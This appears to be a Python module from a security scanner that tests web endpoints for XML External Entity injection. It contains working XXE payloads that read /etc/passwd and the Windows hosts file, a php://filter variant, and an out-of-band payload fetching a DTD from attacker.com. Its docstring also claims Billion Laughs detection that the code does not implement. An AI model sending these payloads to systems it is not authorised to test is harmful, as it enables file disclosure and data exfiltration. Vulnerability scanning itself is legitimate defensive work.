"""
XML External Entity (XXE) injection scanner.
Tests XML parsers for:
- In-band file disclosure via DTD
- Out-of-band (OOB) entity resolution
- Billion Laughs / quadratic expansion DoS detection (safe_mode aware)
"""
from __future__ import annotations

from typing import Any

from core.base_module import BaseModule
from core.result import Severity


class XXEScanner(BaseModule):
    name = "xxe"
    description = "XML External Entity injection detection"
    supported_vectors = ["xxe"]

    PAYLOADS = {
        "file": [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
        ],
        "php": [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        ],
        "oob": [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]><foo></foo>',
        ],
    }

    INDICATORS = ["root:", "daemon:", "bin:", "nobody:", "127.0.0.1", "localhost", "windows", "system32"]

    async def run(self, target: str, **kwargs: Any) -> list[Finding]:
        self._current_target = target
        endpoints = kwargs.get("endpoints", ["/api/xml", "/xml", "/soap", "/api/soap", "/upload"])
        for endpoint in endpoints:
            url = target.rstrip("/") + endpoint
            for category, payloads in self.PAYLOADS.items():
                for payload in payloads:
                    await self._probe(url, payload, category)
        return self.findings

    async def _probe(self, url: str, payload: str, category: str) -> None:
        try:
            resp = await self.client.post(
                url,
                data=payload,
                headers={"Content-Type": "application/xml"},
            )
            body_lower = resp.text.lower()
            for indicator in self.INDICATORS:
                if indicator in body_lower:
                    self.add_finding(
                        vector="xxe",
                        severity="critical",
                        title=f"XXE vulnerability: file disclosure via {category}",
                        description=f"XML parser resolved external entity. Payload triggered disclosure of '{indicator}'.",
                        confidence=85,
                        evidence=[
                            self.client.build_evidence(
                                resp.request, resp, payload=payload,
                                description=f"File content indicator: {indicator}",
                            )
                        ],
                        remediation=(
                            "Disable external entity resolution (LIBXML_NONET). "
                            "Use JSON instead of XML for new APIs. "
                            "Apply strict input validation and sanitize XML payloads."
                        ),
                        references=[
                            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                        ],
                    )
                    return
        except Exception:
            pass
